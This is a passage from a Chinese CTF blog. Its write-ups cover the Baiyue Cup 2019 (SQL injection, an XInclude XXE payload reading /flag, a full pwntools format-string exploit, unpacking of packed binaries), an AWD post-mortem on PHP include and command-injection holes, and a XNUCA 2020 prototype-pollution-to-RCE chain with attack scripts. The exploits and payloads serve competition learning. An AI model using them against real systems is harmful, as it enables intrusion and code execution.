<p><code>c&#39;#</code>=&gt;<code>c\&#39;#</code>出现flag(得删除cookie)</p>
<p>注入点就在这</p>
<p>什么代码导致这种结果</p>
<p>登陆时:<code>$_SESSION[x]=query(&quot;select * from xx where user=&#39;&quot;.mysql_real_escape($_POST[&#39;user&#39;]).&quot;&#39; and pass=&#39;&quot;.mysql_real_escape($_POST[&#39;pass&#39;])&quot;).&quot;&#39;&quot;</code></p>
<p><code>query(&quot;select * from xx where user=&#39;$_SESSION[x]&#39;&quot;)</code></p>
<pre><code>user    php($_SESSION) mysql(&#39;$sql&#39;)
a&#39;        a&#39;             a&#39;
a\&#39;        a\&#39;         a\&#39;

</code></pre><p>存在过滤?</p>
<p>依据个数生成flag链接</p>
<p>后面想到为啥注入点不可以是msgid呢</p>
<p>约束攻击获得一个只带有<code>\</code>的账号</p>
<p>注册一个a+’ ‘*28+’”‘ 的账号</p>
<p>msgid处出现注入点</p>
<p><code>or 1%23</code>成功</p>
<p>用sqlmap爆破得到admin的密码拿到tools.php解密得到:<code>ChunQiuGame</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8ta75axdlj30bv036jrd.jpg" alt="image.png"></p>
<p>正常的xxe没啥用,找到一叶飘零的一篇文章</p>
<p><a href="https://www.anquanke.com/post/id/156227" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156227</a></p>
<p>payload:</p>
<pre><code>&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
 &lt;xi:include href=&quot;file:///flag&quot; parse=&quot;text&quot;/&gt;
&lt;/root&gt;</code></pre><p>flag{5ea7d712-e461-4d29-9246-4ea6266775a8}</p>
<p>………………..气死了就差一点拿到flag</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-printf"><a href="#easy-printf" class="headerlink" title="easy_printf"></a>easy_printf</h3><p>pwnable.tw原题魔改，<code>bss</code>没有<code>stdin</code>,<code>stdout</code>,<code>stderr</code>了，但是一开始有个询问姓名，不知道有什么用,后来试了各种方法，想到了把<code>stdout</code>的<code>fileno</code>改为<code>2</code>，就可以绕过<code>close(1)</code>了<br>而且刚好</p>
<pre><code class="asm"> ► 0x40089f &lt;func1+57&gt;    mov    eax, 0
   0x4008a4 &lt;func1+62&gt;    call   func2 &lt;0x4007fa&gt;

   0x4008a9 &lt;func1+67&gt;    mov    eax, 0
   0x4008ae &lt;func1+72&gt;    mov    rcx, qword ptr [rbp - 8]
   0x4008b2 &lt;func1+76&gt;    xor    rcx, qword ptr fs:[0x28]
   0x4008bb &lt;func1+85&gt;    je     func1+92 &lt;0x4008c2&gt;

   0x4008bd &lt;func1+87&gt;    call   0x400648

   0x4008c2 &lt;func1+92&gt;    leave  
   0x4008c3 &lt;func1+93&gt;    ret    

   0x4008c4 &lt;main&gt;        push   rbp
   0x4008c5 &lt;main+1&gt;      mov    rbp, rsp
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsi rsp  0x7fffc9a192f0 ◂— 0x4141414141414141 (&#39;AAAAAAAA&#39;)
01:0008│          0x7fffc9a192f8 —▸ 0x7fe173507690 (_IO_file_underflow+496) ◂— 0xe8df8948fffffeff
02:0010│          0x7fffc9a19300 —▸ 0x7fe173852540 (_IO_2_1_stderr_) ◂— 0xfbad2087</code></pre>
<p>名字下面残留有<code>stderr</code>，所以读取名字时,<code>partial overwrite</code>改为<code>_IO_2_1_stdout_-&gt;_fileno</code>，然后把<code>_fileno</code>改为2即可，后面的和<code>pwnable.tw</code>没什么区别，有了泄露，也有了无限格式化字符串攻击，随便怎么玩</p>
<p>exp为:</p>
<pre><code class="python">from pwn import *

def fmtstr(offset, addr, data, written):
    cnt = 0
    payload = &#39;&#39;
    address = &#39;&#39;
    for x in data:
        cur = ord(x)
        if cur &gt;= written&amp;0xff:
            to_add = cur - (written&amp;0xff)
        else:
            to_add = 0x100 + cur - (written&amp;0xff)
        round = &#39;&#39;
        if to_add != 0:
            round += &quot;%{}c&quot;.format(to_add)
        round += &quot;%{}$hhn&quot;.format(offset+cnt+len(data)*2)
        assert(len(round) &lt;= 0x10)
        written += to_add + 0x10 - len(round)
        payload += round.ljust(0x10, &#39;_&#39;)
        address += p64(addr+cnt)
        cnt+=1
    return payload + address


def main(host,port=12001):
    if host:
        p = remote(host,port)
    else:
        # p = process(&quot;./easy_printf&quot;,env={&quot;LD_PRELOAD&quot;:&quot;./libc.so&quot;})
        p = process(&quot;./easy_printf&quot;)
        gdb.attach(p,&quot;b *0x000000000400846&quot;)
    p.recvuntil(&quot;write down your name&quot;)
    # t = raw_input(&#39;guess: &#39;)
    t = 0x7
    stdout_fileno = (int(t) &lt;&lt; 12) | 0x690
    p.send(&quot;A&quot;*0x10+p16(stdout_fileno))
    pause()

    buf_addr = 0x601060
    payload =  &quot;%{}c%28$hhn%{}c%58$hn&quot;.format(2,0x2a6).ljust(0x18,&#39;_&#39;)
    payload += fmtstr(9,buf_addr,p64(0x000000000400814)[:3],0x2ab)
    p.send(payload)
    pause()


    payload =  &quot;%{}c%23$hhn%35$p-%36$p^%37$p-%38$p-%39$p*%40$p-&quot;.format(0x14)
    p.send(payload)
    pause()
    p.recvuntil(&quot;^&quot;)
    stack = int(p.recvuntil(&#39;-&#39;,drop=True),16)
    p.recvuntil(&quot;*&quot;)
    libc.address = int(p.recvuntil(&#39;-&#39;,drop=True),16)-0x20837
    info(&quot;stack : &quot; + hex(stack))
    info(&quot;libc : &quot; + hex(libc.address))
    onegadget = 0xf1147+libc.address

    ret_addr = stack - 0x1e8
    payload =  &quot;%{}c%23$hhn&quot;.format(0x14).ljust(0x10,&#39;_&#39;)
    payload += fmtstr(15,ret_addr,p64(onegadget)[:2],0x19)
    p.send(payload)
    pause()
    # :0000000000400865                 retn
    offset = 13
    payload =  &quot;%{}c%16$hhn%{}c%17$hn&quot;.format(ord(p64(onegadget)[2:3]),0x865-ord(p64(onegadget)[2:3])).ljust(0x18,&#39;_&#39;)
    payload += p64(ret_addr+2)+p64(ret_addr-8)
    payload = payload.ljust(0x80,&quot;\x00&quot;)
    p.send(payload)
    p.interactive()
if __name__ == &quot;__main__&quot;:
    libc = ELF(&quot;./libc.so&quot;,checksec=False)
    main(args[&#39;REMOTE&#39;])</code></pre>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="bwarm"><a href="#bwarm" class="headerlink" title="bwarm"></a>bwarm</h3><p>首先，还是查壳，没啥说的 vmp2.0.7</p>
<p> 根据vmp系列脱壳教程，这个壳是1.8以上的方案进行脱壳。先拖入OD，下一个API断点  VirtualProtect (教程建议是下硬件断点，可能是我的OD有问题，硬件断点断不下来，只能是F2断点了 T_T)</p>
<p>然后F9开始跑，测试到第5次跑飞……</p>
<p>那么就在第四次的时开始候单步跟踪，先跳出VirtualProtect 函数 ，然后对代码段设置，内存访问断点</p>
<p>然后F9继续运行，断下来后，在ESP的地方跟踪内存数据，找到SEH结构化异常的上面35C地址那块，下一个硬件写入断点，并取消之前的内存访问断点</p>
<p>然后继续F9运行，再次断下来，这次再在代码断下内存访问断点，然后多次F9运行，注意观察栈帧的变化，快到SEH的地方就接近OEP了，此时已经跟踪到解压后的代码段，然后进行一下代码分析。</p>
<p>完成分析后，代码就还原了，然后单步跟踪，发现OEP </p>
<p>发现OEP后，同时我们也注意到栈帧部分被压入了3条数据，这个就是VMP偷取的代码，我们需要进行还原，于是在当前位置查找一段 0000000000的内存段</p>
<p>然后，对VMP偷取的代码进行patch。最后跳转到OEP 也就是 jmp 012319C9</p>
<p>接着我们把当前的 01231FB5 设置为新的EIP，就可以进行dump内存操作了，填好起始地址和入口地址后，点击脱壳</p>
<p>把脱壳的文件保存为 dump.exe 然后尝试运行，发现不能运行，直接崩溃掉了</p>
<p>于是猜到可能是重定向表的问题造成，用PE编辑器修改一下这里，然后保存。</p>
<p>再次运行，OK ！！</p>
<p>然后可以载入OD进行动态分析了。</p>
<p>为了方便调试，我们知道程序运行后，会提示输入字符串，那么我们先找到输入字符串的地方。</p>
<p>然后开始单步跟踪到这里，就是完成字符串输入后</p>
<p>继续跟踪，我们发现一个base64的字符串：dQkLdqXP=mLMAa8p=lnncQcq/GEPdGKXcNDl=Mnr=pcoBGPQdG1NA3Aw</p>
<p>那么另外一个字符串就是base64的字典了，也就是：0123456789+/=ABCDEFGHIabcdefghiJKLMNOPQRSTUVWXYZjklmnopqrstuvwxyz</p>
<p>于是，我们就可以根据这个对base64zi’f字符串进行解密：</p>
<p>坑了，竟然是乱码，还以为就这样搞定了呢，后来请教了一下大神，他说是字典有问题，于是我仔细的看了一下，确实</p>
<p>字典里面按说是不应该有‘=’ 这个字符的，按base64的说法这个是占位用的来补足字节数。所以按照大神的指点，我把大神的脚本用C++重新写了一遍（也是为了更好的理解反向分析的过程），终了跑出来了 T_T</p>
<p>最后，就是见证奇迹的时刻到了 * ^_^ *</p>
<p>flag{e38b5b63-4bf7-4ee8-b422-83f599fe0c43}</p>
<h3 id="Md5Jungle"><a href="#Md5Jungle" class="headerlink" title="Md5Jungle"></a>Md5Jungle</h3><p>首先查壳，丢到exeinfope里面一看，发现是asp的壳。</p>
<p>于是用手头的asp脱壳工具尝试脱壳，发现都不行，不是不支持就是报错！没办法，只能老实手工脱壳了。</p>
<p>根据ESP定律+IAT修复+重定向表修复后，脱壳的程序可以正常运行。</p>
<p>用OD载入后，开始单步跟踪</p>
<p>到用户输入界面，我随便输入了个字符串：111111111（9个1）单步跟入到下图，发现了flag字样</p>
<p>这个应该是flag的头，于是继续跟进，发现确实在核对输入数据与flag{比较，这块就过不去了</p>
<p>于是果断的从来，输入数据为 flag{111111111，来到了下图的地方，在0x16的位置比较0x7D 也就是’}’符号</p>
<p>由于C语言的字符串下标是从0开始的，也就是字符串第23个字符处必须是}</p>
<p>于是构造字符串：flag{11111111111111111} 继续跟进，接下来是在0x7、0xc、0x11处核对字符 ‘-‘ (即：0x2D)</p>
<p>于是字符串就变成了flag{11-1111-1111-1111}，继续跟进，发现了一个字符串：01E3421C=dump_SCY.01E3421C (ASCII “c7218260ef2b966ab0454e07c55cf4e9”)<br>感觉像是MD5的字符串，于是用python解了一下，得到： oh，结之前的flag应该就是flag{oh-1111-1111-1111}</p>
<p>再次输入后，继续跟进发现过去了，开始进行第二段的比较得到了下图的错误：</p>
<p>于是反复跟比较算法也没有找到任何有效的数据，结合本题的提示是md5段字节爆破，估计是这块需要进行爆破处理了。</p>
<p>于是继续python大法，得到字符串：flag{oh-aa30-1111-1111}</p>
<p>继续输入后，单步跟进，此时发现一个字符串：堆栈地址=001DFC30, (ASCII “YTkxYQ==”)   eax=786B5459<br>看起来像B64编码，于是尝试解码，得到第三组的flag值：a91a 。</p>
<p>想起之前用od也看过字符串，于是找到第四组的字符串：NGZicA==   ，解码为：4fbp</p>
<p>那么最终的flag就是：flag{oh-aa30-a91a-4fbp}</p>
<h3 id="shy"><a href="#shy" class="headerlink" title="shy"></a>shy</h3><p> 首先查壳，丢到ExeinfoPE里面看一下，确定是upx壳</p>
<p>于是丢到OD里面进行脱壳处理，由于是压缩壳，跟踪起来比较麻烦，我选择了个偷懒的办法，下一个api访问断点</p>
<p>即：VirtualProtect ，运行3次F9后就跑飞了，于是在2次运行后，单步跟踪，到OEP</p>
<p>使用OD自带的插件进行脱壳，注意基址和OEP的关系，计算好后填入</p>
<p>然后点击脱壳，双击发现不能运行。</p>
<p>这个问题估计是重定向造成，于是修复一下重定向表的数据。</p>
<p>保存后，再次运行可以正常跑起来了</p>
<p>再次用OD载入，发现入口地址不是OEP</p>
<p>按说是已经解密完成了，于是我定位到OEP （0x1072940）一看究竟。</p>
<p>确实已经解密，那么为了方便调试，我直接用OD改一下入口代码就可以实现了。</p>
<p>然后把修改完毕的程序，重新保存到文件，由于有重定位会有下图的提示，点击 是 ，然后右键保存一份dump0.exe</p>
<p>继续，OD载入dump0.exe 发现修改成功，可以直接跳转到OEP行，然后单步跟踪，到输入后，发现后面的代码是个加密处理的代码，于是丢到IDA里面看一下这块对应的反编译代码。</p>
<p>buf 就是用户输入的字符串，if ( <em>(&amp;v4 + j) != v79[j] )   这个就是关键的比较，那么V79[]就应该是异或后的结果，也就是ben本题的密钥，于是在OD中定位值：6ljh,!;:+&amp;p%i*a=Sc4#pt</em>%</p>
<p>接下来就简单了，直接把这个密钥输入，然后再次定位到这块就能得到flag了</p>
<p>最终得到flag：flag{cb7670ab-c597-4b17}   输入到shy.exe 验证一下 : )</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/byb2019/">https://www.ccreater.top/1970/01/01/byb2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/byb2019/" data-id="ckmn5756m0049s1ni0m4x8w6r" data-title="百越杯2019" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-byb2019线下awd" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/byb2019%E7%BA%BF%E4%B8%8Bawd/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/byb2019%E7%BA%BF%E4%B8%8Bawd/">百越杯总结</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="百越杯总结"><a href="#百越杯总结" class="headerlink" title="百越杯总结"></a>百越杯总结</h1><h2 id="include-require"><a href="#include-require" class="headerlink" title="include,require"></a>include,require</h2><p>如果<strong>文件被包含两次</strong>，PHP 5   <strong>发出致命错误</strong>因为函数已经被定义，但是 PHP 4 不会对在   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.return.html">return</a> 之后定义的函数报错。推荐使用   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include-once.html">include_once</a> 而不是检查文件是否已包含并在包含文件中有条件返回。 </p>
<h2 id="include-once-require-once"><a href="#include-once-require-once" class="headerlink" title="include_once,require_once"></a>include_once,require_once</h2><p><em>include_once</em> 语句在脚本执行期间包含并运行指定文件。此行为和   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include.html">include</a>   语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次。</p>
<p><em>require_once</em> 语句和 <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.require.html">require</a>   语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 </p>
<p><strong>如果所包含文件不存在,include_once不会退出,而require_once会直接退出</strong></p>
<h2 id="比赛失误原因"><a href="#比赛失误原因" class="headerlink" title="比赛失误原因"></a>比赛失误原因</h2><h3 id="log没挂好"><a href="#log没挂好" class="headerlink" title="log没挂好"></a>log没挂好</h3><h3 id="没有找到有效的攻击流量"><a href="#没有找到有效的攻击流量" class="headerlink" title="没有找到有效的攻击流量"></a>没有找到有效的攻击流量</h3><p>grep这个命令不够熟悉,</p>
<h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>我的过滤条件变迁:</p>
<p><code>&quot;flag&quot; =&gt; &quot;/flag&quot;</code>,到这里后我就没有继续过滤,”/flag”其实还是有很多干扰信息的,我就差一步</p>
<p><code>grep &quot;/flag &quot; */*</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fl7ptrij30k20arac7.jpg" alt="image.png"></p>
<p><code>grep &quot;/flag &quot; */* -C300 | grep &quot;end pageheader&quot; -C 10</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fk6h3jxj30oa05cdfx.jpg" alt="image.png"></p>
<h3 id="没找到的洞"><a href="#没找到的洞" class="headerlink" title="没找到的洞"></a>没找到的洞</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c2qcxxyj30pl01vdgk.jpg" alt="image.png"></p>
<p>php的web主要也就这两的洞</p>
<h4 id="grayscale"><a href="#grayscale" class="headerlink" title="grayscale"></a>grayscale</h4><p><code>include $_GET[&#39;img&#39;];</code>配合有后门的图片m.jpg</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c4zci7cj30f001g3yg.jpg" alt="image.png"></p>
<p>开始我直接搜索<code>&lt;?</code>和<code>&lt;%</code> 没搜索到就以为是误报,??也能执行?????</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c93p00wj307100zjr6.jpg" alt="image.png"></p>
<p>用strings查看////,编码问题导致??,以后用ascii码来查看</p>
<h4 id="ssystem"><a href="#ssystem" class="headerlink" title="ssystem"></a>ssystem</h4><p>虽然找到了exec那个洞</p>
<p>但是在index.php中：</p>
<pre><code class="php">&lt;?php
if (isset($_GET[&#39;page&#39;])){
    $page = $_GET[&#39;page&#39;];

}else{
        $page = &#39;chart.php&#39;;
}
?&gt;
&lt;?php
    include_once &quot;$page&quot;;
?&gt;</code></pre>
<p>可以配合文件上传拿到shell或者是直接include /flag也能拿到flag</p>
<h3 id="洞没修好"><a href="#洞没修好" class="headerlink" title="洞没修好"></a>洞没修好</h3><h4 id="SSystem"><a href="#SSystem" class="headerlink" title="SSystem"></a>SSystem</h4><pre><code class="php">    &lt;?php
    if (isset($_POST[&#39;name&#39;])){
        $name = $_POST[&#39;name&#39;];
        exec(&quot;tar -cf backup/$name images/*.jpg&quot;);
        echo &quot;&lt;div class=\&quot;alert alert-success\&quot; role=\&quot;alert\&quot;&gt;
                导出成功,&lt;a href=&#39;backup/$name&#39;&gt;点击下载&lt;/a&gt;&lt;/div&gt;&quot;;
    }
    ?&gt;</code></pre>
<p>原本以为<code>$name</code>再参数位置,用escapeshellarg就可以了</p>
<p>但是!!!!!!!虽然escapeshellarg会把$name放在引号里面</p>
<pre><code>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。 </code></pre><p>php手册里解释是单引号,实际却是<code>tar -cf backup/&quot;123&quot; images/*.jpg</code></p>
<p>?????这是在我本机php5.6的环境下,php7环境也是双引号???</p>
<p>然后在自己的服务器上之前是双引号后面是单引号????</p>
<p>由于不知道靶场上会怎样,我也不确定我用escapeshellarg是不是修好了,然后这题就修补失败了</p>
<p>比较好的修复方案(在实现原功能的情况下去掉命令执行):</p>
<pre><code>exec(&quot;tar -cf backup/aa.tar images/*.jpg&quot;);
rename(&quot;backup/aa.tar&quot;,&quot;backup/$name.tar&quot;);</code></pre><h3 id="没找到check没过的原因"><a href="#没找到check没过的原因" class="headerlink" title="没找到check没过的原因"></a>没找到check没过的原因</h3><p>check的id是172.16.4.7</p>
<p>但是直接搜索 HTTP 没找到check没过的原因,我猜因为拖下来的log只有前半小时,而开局的是否我们的check好像是过的</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我看到洞的时候没有修好</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/byb2019线下awd/">https://www.ccreater.top/1970/01/01/byb2019线下awd/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/byb2019%E7%BA%BF%E4%B8%8Bawd/" data-id="ckmn5756n004cs1niey3pdsub" data-title="百越杯总结" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-XNUCA_2020_oooooooldjs题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/">XNUCA_2020_oooooooldjs题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="XNUCA-2020-oooooooldjs题解-md"><a href="#XNUCA-2020-oooooooldjs题解-md" class="headerlink" title="XNUCA_2020_oooooooldjs题解.md"></a>XNUCA_2020_oooooooldjs题解.md</h1><p>文章首发于<a href="https://www.anquanke.com/post/id/221388" target="_blank" rel="noopener">安全客</a></p>
<p>题目描述</p>
<blockquote>
<p><code>npm audit</code> may miss something, be careful of the version of <code>lodash</code>. There is prototype pollution in <code>express-validator</code>, limited but powerful。</p>
</blockquote>
<p>npm audit发现lodash有原型链污染漏洞</p>
<pre><code># Run  npm update lodash --depth 2  to resolve 1 vulnerability

  Low             Prototype Pollution                         

  Package         lodash                                      

  Dependency of   express-validator                           

  Path            express-validator &gt; lodash                  

  More info       https://npmjs.com/advisories/1523      </code></pre><p>在<a href="https://snyk.io/test/npm/express-validator/2.21.0中查看lodash中出现原型链污染的地方，依次下断点" target="_blank" rel="noopener">https://snyk.io/test/npm/express-validator/2.21.0中查看lodash中出现原型链污染的地方，依次下断点</a></p>
<p>传入json数据:<code>{&quot;233&quot;:123}</code>发现：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031215650.png" alt="image1151"></p>
<p>调用了存在原型链污染的set方法，且[233]不为object的键值，在这里可以触发原型链污染</p>
<p>一波测试后得到原型链污染的payload:<code>{&quot;.\&quot;].__proto__[\&quot;crossDomain&quot;:{&quot;1&quot;:&quot;2&quot;}}</code>，但是不能控制原型链污染的值</p>
<p>审计题目代码发现，非常有意思的两个地方</p>
<ol>
<li><p>显眼的dangerous<br><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220029.png" alt="image1432"></p>
</li>
<li><p>这里自己实现了数据库的CURD四种方法</p>
</li>
</ol>
<p>学习了一波后发现第一点可以触发RCE</p>
<pre><code class="javascript">const { JSDOM } = require(&quot;jsdom&quot;);

new JSDOM(`
&lt;body&gt;
  &lt;script&gt;
    const outerRealmFunctionConstructor = Node.constructor;
    const process = new outerRealmFunctionConstructor(&quot;return process&quot;)();
    const require = process.mainModule.require;

    // Game over!
    const fs = require(&#39;fs&#39;);
    console.log(fs.readdirSync(&#39;.&#39;));
  &lt;/script&gt;
&lt;/body&gt;
`, { 
  runScripts: &quot;dangerously&quot; 
});</code></pre>
<p>在util.js中定义了唯一会用到jsdom的函数</p>
<pre><code class="javascript">const {
    JSDOM
} = require(&quot;jsdom&quot;)
const {
    window
} = new JSDOM(``, {
    url: originUrl,
    runScripts: &quot;dangerously&quot;
})
// server side `$` XD
const $ = require(&#39;jquery&#39;)(window)

const requests = async (url, method) =&gt; {
    let result = &quot;&quot;
    try {
        result = await $.ajax({
            url: url,
            type: method,
        })

        console.log(result)
    } catch (err) {
        console.log(err)
        result = {
            data: &quot;&quot;
        }
    }

    return result.data
}</code></pre>
<p>jquery的ajax有个特性是如果返回的content-type是text/javascript等代表着js脚本，那么便会执行js，结合上面的jsdom从而RCE，但是在低版本的话确实可以这么做，但是在高版本jquery进行了限制，如果是跨域请求便不会执行脚本</p>
<p>调试jquery代码发现：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220811.jpg" alt="image2617"></p>
<p>这里会覆盖我们的content-type，继续调试发现设置crossDomain的逻辑</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220938.png" alt="image2751"></p>
<p>如果s.crossDomain == null就会进入是否跨域的判断</p>
<p>利用前面的原型链污染从而绕过jquery的跨域限制</p>
<p>还剩下一个问题，我们如何传入自己的url</p>
<p>express开着一个中间件限制了我们url,而且也不让更新url类型的数据</p>
<pre><code class="javascript">const middlewares = [
    // should be
    body(&#39;*&#39;).trim(),
    body(&#39;type&#39;).if(body(&#39;type&#39;).exists()).bail().isIn([&#39;url&#39;, &#39;text&#39;])
    .withMessage(&quot;type must be `url` or `text`&quot;),
    body(&#39;block&#39;).if(body(&#39;type&#39;).exists()).notEmpty()
    .withMessage(&quot;no `block` content&quot;).bail()
    .if(body(&#39;type&#39;).isIn([&#39;url&#39;])).isURL({
        require_tld: false
    })
    .custom((value, {
        req
    }) =&gt; new URL(value).host === host)
    .withMessage(&quot;invalid url!&quot;),
    (req, res, next) =&gt; {
        const errors = validationResult(req)
        if (!errors.isEmpty()) {
            return res.status(400).json({
                errors: errors.array()
            })
        }
        next()
    }
]</code></pre>
<p>回到我们刚刚说的第二点有趣的地方，这个简单的数据库并不支持事务功能，也就是说删除type和data并不会同时删除是存在一定的时间差的，相关代码如下</p>
<pre><code class="javascript">D(id) {
        let di, dt
        for (const index in this.datas) {
            if (this.datas[index].id === id) {
                dt = this.types[index]
                this.types.splice(index, 1)
                di = index
            }
        }
        if (dt === &#39;url&#39;) {
            requests(this.datas[di].block, &quot;DELETE&quot;).finally(()=&gt;{
                this.datas = this.datas.filter((value)=&gt;value.id !== id)
            })
        } else {
            this.datas = this.datas.filter((value)=&gt;value.id !== id)
        }
    }</code></pre>
<p>在删除了type后，他进行了一个相当耗时的操作：访问url，之后才删除data，又因为这里是一个链式删除，一个接着一个删除，所有type删除完后它可能才删除一个data</p>
<p>于是有：</p>
<pre><code class="python">import requests
challenge = &quot;http://eci-2ze1whgyeh7v30y5j8yh.cloudeci1.ichunqiu.com:8888&quot;
def insertUrl(url):
    burp0_url = challenge+&quot;/data&quot;
    burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
    burp0_data = {&quot;type&quot;: &quot;url&quot;, &quot;block&quot;: url}
    result = {}
    while True:
        try:
            result = requests.post(burp0_url, headers=burp0_headers, data=burp0_data).json()
        except Exception as e:
            continue
        return result

def insertData(data):
    burp0_url = challenge+&quot;/data&quot;
    burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
    burp0_data = {&quot;type&quot;: &quot;text&quot;, &quot;block&quot;: data}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    return r.json()

def setLongLine(length=2000):
    endId=&quot;&quot;
    url = &quot;http://localhost:8888/data/fake-uuid&quot;
    count = 0
    while count &lt; length:
        count+=1
        data = insertUrl(url)
        url = &quot;http://localhost:8888/data/&quot;+data[&quot;data&quot;][&quot;id&quot;]
        endId = data[&quot;data&quot;][&quot;id&quot;]</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/XNUCA_2020_oooooooldjs题解/">https://www.ccreater.top/1970/01/01/XNUCA_2020_oooooooldjs题解/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
